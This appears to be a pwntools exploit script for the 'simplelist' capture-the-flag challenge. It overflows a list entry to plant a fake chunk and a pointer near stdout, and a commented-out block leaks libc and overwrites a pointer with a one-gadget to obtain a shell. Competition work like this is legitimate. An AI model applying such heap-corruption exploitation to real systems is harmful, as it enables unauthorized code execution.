# -*- coding: utf-8 -*-
from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'simplelist.quals.beginners.seccon.jp'
POST = 9003
libc = ELF("./libc-2.33.so")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  io = process(FILENAME)
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  c = gdb.attach(io,gdbscript='''b main''')


def create(s):
  c.sendline('1')
  c.sendline(str(s))
  sleep(0.5)

def edit(num,s):
  c.recvuntil('>')
  c.sendline('2')
  c.sendline(str(num))
  sleep(0.5)
  c.sendline(str(s))
  sleep(0.5)

def show():
  c.recvuntil('>')
  c.sendline('3')
  sleep(0.5)

pad = 0x20
stdout = 0x4036d0

create(0)
create(1)
payload = '\x00'*pad
payload+= p64(0x31)
payload+= p64(stdout-8)
#payload+= p64(0)
edit(0,payload)



c.recvuntil('>')
c.recvuntil('>')
c.recvuntil('>')
'''
c.recvuntil('>')
c.sendline('2')
c.sendline('2')
c.recvuntil('Old content: ')
leak = c.recv(6)+'\x00\x00'
leak = u64(leak)
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
payload = p64(libc.address + 0xde78f)
c.sendline(payload)

sleep(1)
'''
c.interactive()